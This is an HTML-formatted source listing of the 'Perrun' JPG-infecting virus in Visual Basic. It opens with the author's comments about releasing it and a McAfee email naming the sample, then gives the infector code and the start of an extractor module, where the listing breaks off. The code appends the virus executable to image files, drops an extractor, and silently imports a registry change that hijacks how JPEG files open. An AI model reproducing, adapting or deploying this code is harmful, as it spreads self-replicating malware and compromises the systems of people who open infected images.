<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	font-weight: bold;
	color: #FF0000;
}
.sc3 {
	color: #0000FF;
}
.sc4 {
	color: #808080;
}
.sc6 {
	font-weight: bold;
}
.sc7 {
}
.sc9 {
}
.sc12 {
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">' -----------------------------
' Perrun Virus Source Code
' -----------------------------
' 
' i've written this when i was still a member of the rRlf ("hello rRlf guys!")... i decided to officially release the 
' source in ebcvg #2...
' 
' history
' --------
' w32.hllp.jpginfector, as i named my lame proof-of-concept virus, was written on a fine afternoon of june 13, 2002 because
' i just wanted to make a working proof of my article "Infecting Picture Files : A Desperate Approach"... that lame article
' was written because of my reggae song "Your Kiss, Your Love and Some Pictures" dedicated to my girlfriend... 
' so the root of all the Perrun phenomenon was not the eagerness to achieve fame... the root is LOVE... "Hi Janis!" :)
' 
' after the finishing touches to the binary, i submitted it to av sites... trend, symantec, mcafee.. (can't clearly remember
' if i submitted it to avp, f-secure and sophos).... then i rested and ate my dinner.... i checked my mail again then
' i recieved the remails from symantec and mcafee... i cleaned those excess trashes but luckily i forgot to delete 
' mcafee's
' 
' 
' ------------------------------------------------------------------------
' From: "Vsample" &lt;Vsample@avertlabs.com&gt; 
' To: "'alcopaul'" &lt;alcopaul@digitelone.com&gt; 
' Subject: RE: Variant Found: 233006 - first virus attacking jpg files... 
' Date: Thu, 13 Jun 2002 07:56:01 -0700 
' 
' Thanks very much for the sample.  We have named this to W32/Perrun
' 
' We have added a description on our virus library. See link below.
' 
' http://vil.nai.com/vil/content/v_99522.htm
' &lt;http://vil.nai.com/vil/content/v_99522.htm&gt; 
' 
' Again thanks very much and we value your contribution.
' 
' Regards,
' 
' Mohinder Gill
' Virus Research Analyst
' McAFEE AVERT (UK)
' A Division of NAI Labs
' When sending Virus Samples
'       If you require further assistance with this virus or other
' virus detection and/or cleaning please send the proposed sample(s) 
' zipped
' with the password "infected" (lower case) to one of the email addresses
' listed below.
' 
'       Please note: We sometimes receive a file that is analysed as
' cleaned, but actually find later that the file was infected when it 
' left the
' sender, and was cleaned along the line by mail gateway scanners, hence 
' the
' need for password-protected zip files.
' 
'       NOTE:  We try our very best to process the incoming samples
' as soon as they arrive and hope to respond to customers on the same 
' day.
' However our official response time for virus samples is 48 hours 
' (excluding
' weekends).  This time may be extended due to samples which require 
' further
' analysis.
' 
' All product-related questions and comments can be addressed through
' technical support and customer service, including: 
' * Any Virus Removal issues
' * product installation and update questions 
' * product usage questions 
' * specific operating system/version questions 
' 
'              For samples related issues please contact: 
'       UK:   Vsample@nai.com 
'       USA:      Virus_Research@nai.com 
'       Germany: Virus_Research_DE@nai.com 
'       France      Virus_Research_FR@nai.com
'       Rest of Europe  Virus_Research_Europe@nai.com
' Please send samples to one of the above addresses only.
' For Technical Support issues please contact: 
'   UK-
'       * +44 (0) 1296 318 733
'       *  +44 (0) 1296 318 734
'       Email: TVD-Support-UK@nai.com
' &lt;mailto:TVD-Support-UK@nai.com&gt; 
' 
' Rest of Europe- tech-support-europe@nai.com
'       * +31 (0) 20 586 6100
' Useful WEB sites
'        
' www.nai.com (Network Associates Inc. products)
' http://www.mcafeeb2b.com/asp_set/anti_virus/alerts/intro.asp (Stay 
' ahead of
' New Viruses)
' http://www.mcafeeb2b.com/naicommon/download/dats/find.asp (Latest Dat 
' files
' / SuperDats 4.1.60 engine)
' http://vil.nai.com/villib/alpha.asp (NAI Virus Library - Descriptions 
' of
' viruses)
' 
' 
' 
' 
' 
' 
' 
'       -----Original Message-----
'       From:   alcopaul [mailto:alcopaul@digitelone.com]
'       Sent:   13 June 2002 11:06
'       To: virus_research@nai.com
'       Subject:    Variant Found: 233006 - first virus
' attacking jpg files...
' 
'        &lt;&lt; File: JPG_Virus_Final_Release.zip &gt;&gt; &lt;&lt; File: MAVIS.txt
' &gt;&gt; hope to see a desc from your site.. it's a new way of
'       infection.. :)
'   
' ____________________________________________________________________
'       ** Get your free E-Mail account at WWW.DIGITELONE.COM **
' 
' ----------------------------------------------------------------------------
' 
' *** i just wanted mcafee to see a description of it from their site... nothing more, nothing less.. :P
' 
' then two days after my submission of the virus to av sites, i checked out zdnet for some news.. then i found an
' article that refers to Perrun.. "what a heck! that's my virus!", i thought... i tried my luck to see some of my
' virus' articles in yahoo then i got a lot of hits...
' 
' can't please everybody.. there exist many criticisms about this virus... i read a lot of them... hehehe.. 
' but i don't care..
' 
' 
' final thought : this is a lame virus that "shook" the news for one time...
' 
' enjoy..
' 
' alcopaul
' 
' indirect thanks to murkry.. i borrowed the spawned host execution routine from his vb virus...
' 
' =========================
' virus
' =========================
</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_Name</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Module1"</span><span class="sc0">
</span><span class="sc3">Option</span><span class="sc0"> </span><span class="sc3">Explicit</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Main</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">ffile</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">sfile</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">a</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">vc</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">spath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">arr1</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Variant</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">lenhost</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">mark</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">g</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc1">'probable host
</span><span class="sc7">ffile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FreeFile</span><span class="sc0">

</span><span class="sc1">'resolve virus path
</span><span class="sc0">
</span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">App.Path</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">jpgvir</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">

</span><span class="sc1">'find picture files in directory of the virus
</span><span class="sc7">sfile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Dir$</span><span class="sc6">(</span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"*.jpg"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">sfile</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">a</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">a</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">spath</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">sfile</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"/"</span><span class="sc0">
</span><span class="sc7">sfile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Dir$</span><span class="sc0">
</span><span class="sc3">Wend</span><span class="sc0">

</span><span class="sc1">'store filenames in array
</span><span class="sc0">
</span><span class="sc7">arr1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Split</span><span class="sc6">(</span><span class="sc7">a</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"/"</span><span class="sc6">)</span><span class="sc0">

</span><span class="sc1">'1 by 1 query... and now introducing a new algorithm for 1 infection per run
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc3">Each</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc0"> </span><span class="sc3">In</span><span class="sc0"> </span><span class="sc7">arr1</span><span class="sc0">
</span><span class="sc1">'check for virus sig
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Read</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc9">#ffile
</span><span class="sc7">lenhost</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">ffile</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc7">vc</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc7">lenhost</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc9">#ffile, , vc
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc9">#ffile
</span><span class="sc7">mark</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">vc</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">mark</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"alco"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc1">'not infected?
'infect!
</span><span class="sc3">GoTo</span><span class="sc0"> </span><span class="sc7">notinfected</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc1">'infected?
'search for moe!
</span><span class="sc3">GoTo</span><span class="sc0"> </span><span class="sc7">gggoop</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc7">notinfected</span><span class="sc6">:</span><span class="sc0">
</span><span class="sc1">'1 infection / run
</span><span class="sc7">infest</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0">
</span><span class="sc7">gggoop</span><span class="sc6">:</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0"> </span><span class="sc7">host</span><span class="sc0">
</span><span class="sc7">g</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Replace</span><span class="sc6">(</span><span class="sc7">jpgvir</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"\\"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">extractXTrktr</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">g</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"extrk.exe"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">extractXTrktr</span><span class="sc6">(</span><span class="sc12">name</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">a</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">vircode</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">extractrcode</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">App.Path</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">jpgvir</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Read</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc7">vircode</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">5636</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">extractrcode</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc2">5636</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vircode</span><span class="sc0">
</span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">extractrcode</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"extrk.exe"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Write</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#2</span><span class="sc0">
</span><span class="sc7">Put</span><span class="sc0"> </span><span class="sc2">#2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">extractrcode</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">#2</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"reg.mp3"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Output</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#3</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#3</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"REGEDIT4"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#3</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#3</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"[HKEY_CLASSES_ROOT\jpegfile\shell\open\command]"</span><span class="sc0">
</span><span class="sc7">Print</span><span class="sc0"> </span><span class="sc2">#3</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"@="""</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc12">name</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" %1"""</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">#3</span><span class="sc0">
</span><span class="sc7">a</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"regedit /s "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"reg.mp3"</span><span class="sc0">
</span><span class="sc7">Shell</span><span class="sc0"> </span><span class="sc7">a</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">infest</span><span class="sc6">(</span><span class="sc7">hostpath</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">ffile</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">jpgcode</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">vircode</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc7">ffile</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">FreeFile</span><span class="sc0">
</span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">App.Path</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">jpgvir</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0"> </span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">hostpath</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Read</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc9">#ffile
</span><span class="sc7">jpgcode</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc7">ffile</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc9">#ffile, , jpgcode
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc9">#ffile
</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">jpgvir</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">App.EXEName</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">".exe"</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Read</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">
</span><span class="sc7">vircode</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc7">LOF</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc3">Get</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">vircode</span><span class="sc0">
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc2">#1</span><span class="sc0">

</span><span class="sc7">Open</span><span class="sc0"> </span><span class="sc7">hostpath</span><span class="sc0"> </span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">Binary</span><span class="sc0"> </span><span class="sc7">Access</span><span class="sc0"> </span><span class="sc7">Write</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc9">#ffile
</span><span class="sc7">Put</span><span class="sc0"> </span><span class="sc9">#ffile, , jpgcode
</span><span class="sc7">Put</span><span class="sc0"> </span><span class="sc9">#ffile, , vircode
</span><span class="sc7">Close</span><span class="sc0"> </span><span class="sc9">#ffile
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc1">'proof.001, part of the first ever jpg virus by alcopaul
'w32.hllp.JPGInfector
'june 13, 2002
</span><span class="sc0">
</span><span class="sc6">=======================</span><span class="sc0">
</span><span class="sc7">extractor</span><span class="sc0">
</span><span class="sc6">=======================</span><span class="sc0">

</span><span class="sc3">Attribute</span><span class="sc0"> </span><span class="sc7">VB_Name</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"Module1"</span><span class="sc0">
</span><span class="sc3">Option</span><span class="sc0"> </span><span class="sc3">Explicit</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">OpenProcess</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwDesiredAccess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">bInheritHandle</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">dwProcessId</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetExitCodeProcess</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hProcess</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">lpExitCode</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc3">Declare</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">CloseHandle</span><span class="sc0"> </span><span class="sc3">Lib</span><span class="sc0"> </span><span class="sc4">"kernel32"</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc3">ByVal</span><span class="sc0"> </span><span class="sc7">hObject</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">iResult</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">hProg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">idProg</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Private</span><span class="sc0"> </span><span class="sc7">iExit</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">STILL_ACTIVE</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H103</span><span class="sc0">
</span><span class="sc3">Const</span><span class="sc0"> </span><span class="sc7">PROCESS_ALL_ACCESS</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">&amp;H1F0FFF</span><span class="sc0">
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">Main</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">HostLength</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">Long</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">HostCode</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">vircode</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
